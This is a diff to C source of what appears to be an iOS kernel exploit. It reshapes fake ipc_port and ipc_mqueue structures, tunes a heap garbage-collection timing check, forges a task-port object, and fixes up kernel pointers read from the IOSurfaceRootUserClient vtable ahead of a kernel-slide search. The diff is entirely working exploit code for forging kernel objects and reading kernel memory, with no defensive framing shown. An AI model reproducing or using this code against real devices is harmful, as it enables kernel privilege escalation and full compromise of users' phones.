@@ -62,35 +62,43 @@ typedef volatile struct
     /* 0x48 */ uint64_t iv_hash_link_prev;
 } fake_ipc_voucher_t;
 
-typedef volatile struct 
-{
+typedef struct {
+    uint64_t hwlock;
+    uint64_t type;
+} lck_spin_t;
+
+struct ipc_object {
     uint32_t ip_bits;
     uint32_t ip_references;
-    struct {
-        uint64_t data;
-        uint64_t type;
-    } ip_lock; // spinlock
+    lck_spin_t io_lock_data;
+};
+
+typedef struct ipc_mqueue {
     struct {
         struct {
+            uint32_t flags;
+            uint32_t waitq_interlock;
+            uint64_t waitq_set_id;
+            uint64_t waitq_prepost_id;
             struct {
-                uint32_t flags;
-                uint32_t waitq_interlock;
-                uint64_t waitq_set_id;
-                uint64_t waitq_prepost_id;
-                struct {
-                    uint64_t next;
-                    uint64_t prev;
-                } waitq_queue;
-            } waitq;
-            uint64_t messages;
-            uint32_t seqno;
-            uint32_t receiver_name;
-            uint16_t msgcount;
-            uint16_t qlimit;
-            uint32_t pad;
-        } port;
-        uint64_t klist;
-    } ip_messages;
+                uint64_t next;
+                uint64_t prev;
+            } waitq_queue;
+        } waitq;
+        uint64_t messages;
+        uint32_t seqno;
+        uint32_t receiver_name;
+        uint16_t msgcount;
+        uint16_t qlimit;
+        uint32_t pad;
+    } port;
+    uint64_t klist;
+} *ipc_mqueue_t;
+
+typedef volatile struct 
+{
+    struct ipc_object ip_object;
+    struct ipc_mqueue ip_messages;
     uint64_t ip_receiver;
     uint64_t ip_kobject;
     uint64_t ip_nsrequest;
@@ -240,7 +248,7 @@ void trigger_gc_please()
             the idea here is to look for a longer spray which signals that GC may have
             taken place
         */
-        if (avgTime && tdelta - avgTime > avgTime/2)
+        if (avgTime && tdelta - avgTime > avgTime)
         {
             LOG("got gc at %d -- breaking", i);
             gc_ports_max = i;
@@ -1010,9 +1018,9 @@ found_voucher_lbl:;
     bzero((void *)fakeport, sizeof(kport_t));
 
     /* set up our fakeport for use later */
-    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
-    fakeport->ip_references = 100;
-    fakeport->ip_lock.type = 0x11;
+    fakeport->ip_object.ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
+    fakeport->ip_object.ip_references = 100;
+    fakeport->ip_object.io_lock_data.type = 0x11;
     fakeport->ip_messages.port.receiver_name = 1;
     fakeport->ip_messages.port.msgcount = 0;
     fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
@@ -1268,6 +1276,8 @@ value = value | ((uint64_t)read64_tmp << 32);\
         LOG("failed to get IOSurfaceRootUserClient vtab!");
         goto out;
     }
+    if ((iosruc_vtab & 0xffffff0000000000) != 0xffffff0000000000)
+        iosruc_vtab |= 0xfffffff000000000;
 
     uint64_t get_trap_for_index_addr = 0x0;
     rk64(iosruc_vtab + (offsets->iosurface.get_external_trap_for_index * 0x8), get_trap_for_index_addr);
@@ -1276,6 +1286,9 @@ value = value | ((uint64_t)read64_tmp << 32);\
         LOG("failed to get IOSurface::getExternalTrapForIndex func ptr!");
         goto out;
     }
+
+    if ((get_trap_for_index_addr & 0xffffff0000000000) != 0xffffff0000000000)
+        get_trap_for_index_addr |= 0xfffffff000000000;
 
 #define KERNEL_HEADER_OFFSET        0x4000
 #define KERNEL_SLIDE_STEP           0x100000
